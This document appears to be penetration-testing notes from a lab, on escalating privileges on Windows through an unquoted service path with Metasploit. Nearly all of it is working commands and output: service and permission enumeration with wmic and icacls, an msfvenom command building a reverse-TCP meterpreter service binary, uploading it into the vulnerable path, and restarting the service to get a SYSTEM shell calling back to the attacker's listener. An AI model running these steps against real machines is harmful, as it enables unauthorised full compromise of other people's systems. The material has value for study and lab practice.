# Metasploit

## 01 - Usage

```
msf > use exploit/windows/local/unquoted_service_path

msf exploit(windows/local/unquoted_service_path) > set payload windows/x64/meterpreter/reverse_tcp

msf exploit(windows/local/unquoted_service_path) > options 

Module options (exploit/windows/local/unquoted_service_path):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.100.35   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf exploit(windows/local/unquoted_service_path) > set lhost <IP>

msf exploit(windows/local/unquoted_service_path) > set lport <PORT>

msf exploit(windows/local/unquoted_service_path) > set quick <true | false>

msf exploit(windows/local/unquoted_service_path) > set session <session_ID>

msf exploit(windows/local/unquoted_service_path) > run
```

## 02 - Detect

```
meterpreter > shell
Process 3448 created.
Channel 5 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>wmic service get name,startname,pathname | findstr /i "localsystem" | findstr /i "C:\program files"
..[omitted]..
unquotedsvc                          C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe                LocalSystem
..[omitted]..

C:\Users\user>exit
exit
meterpreter > load extapi
Loading extension extapi...Success.
meterpreter > service_query unquotedsvc

Name        : unquotedsvc
Display     : Unquoted Path Service
Account     : LocalSystem
Status      : Stopped
Start Type  : Manual
Path        : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
L.O. Group  : 
Interactive : No
DACL        : D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;WD)

meterpreter > execute -Hicf icacls -a "\"C:\Program Files\Unquoted Path Service\""
Process 3592 created.
Channel 14 created.
C:\Program Files\Unquoted Path Service BUILTIN\Users:(F)
                                       NT SERVICE\TrustedInstaller:(I)(F)
                                       NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                                       NT AUTHORITY\SYSTEM:(I)(F)
                                       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Administrators:(I)(F)
                                       BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                                       BUILTIN\Users:(I)(RX)
                                       BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                                       CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
```

## 03 - Exploit

```
meterpreter > bg
[*] Backgrounding session 1...
msf6 exploit(multi/script/web_delivery) > use exploit/windows/local/unquoted_service_path
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/unquoted_service_path) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/unquoted_service_path) > options

Module options (exploit/windows/local/unquoted_service_path):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   QUICK    true             no        Stop at first vulnerable service found
   SESSION                   yes       The session to run this module on


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/local/unquoted_service_path) > set lhost 10.8.145.108
lhost => 10.8.145.108
msf6 exploit(windows/local/unquoted_service_path) > set lport 53
lport => 53
msf6 exploit(windows/local/unquoted_service_path) > set session 1
session => 1
msf6 exploit(windows/local/unquoted_service_path) > exploit

[*] Started reverse TCP handler on 10.8.145.108:53
[*] Finding a vulnerable service...
[*] Attempting exploitation of AWSLiteAgent
[*] Exploit completed, but no session was created.
```

Well that was a disappointment looks like we'll have to do the manual way which is much better sometimes

`$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.8.145.108 lport=53 -f exe-service -o common.exe`

```
msf6 exploit(windows/local/unquoted_service_path) > handler -p windows/x64/meterpreter/reverse_tcp -H 10.8.145.108 -P 53 -x
[*] Payload handler running as background job 2.

[*] Started reverse TCP handler on 10.8.145.108:53
msf6 exploit(windows/local/unquoted_service_path) > sessions -1
[*] Starting interaction with 1...

meterpreter > upload common.exe "C:\Program Files\Unquoted Path Service"
[*] uploading  : /home/user/common.exe -> C:\Program Files\Unquoted Path Service
[*] uploaded   : /home/user/common.exe -> C:\Program Files\Unquoted Path Service\common.exe
meterpreter > service_control unquotedsvc restart
[+] Operation restart succeeded.
[*] Sending stage (200774 bytes) to 10.10.229.49
[*] Meterpreter session 3 opened (10.8.145.108:53 -> 10.10.229.49:49302) at 2022-05-29 16:21:38 -0400

meterpreter > sessions 3
[*] Backgrounding session 1...
[*] Starting interaction with 3...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

## 04 - Cleanup

`meterpreter > rm "C:\Program Files\Unquoted Path Service\common.exe"`